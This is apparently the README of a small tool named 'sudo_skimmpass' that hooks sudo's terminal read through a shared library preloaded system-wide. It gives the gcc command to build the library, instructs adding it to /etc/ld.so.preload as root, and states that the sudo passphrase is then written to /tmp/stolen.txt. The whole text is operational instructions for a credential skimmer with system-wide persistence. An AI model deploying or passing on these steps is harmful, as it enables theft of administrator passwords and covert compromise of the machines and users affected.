# sudo_skimmpass
## Hijacking sudo's call to read terminal's file descriptor to log user input


Compile using: `gcc -fPIC -shared -ldl sudo_lib_hook.c -o /tmp/cap_pass.so`

Then add the resulting shared library `/tmp/cap_pass.so` to the file `/etc/ld.so.preload`.
Note: *You will need to perform this action as root.*


You can now open a new terminal, and run `sudo su` and enter your passphrase.  You may
now log back out, and finally, check `/tmp/stolen.txt`.  It should now contain your
passphrase.
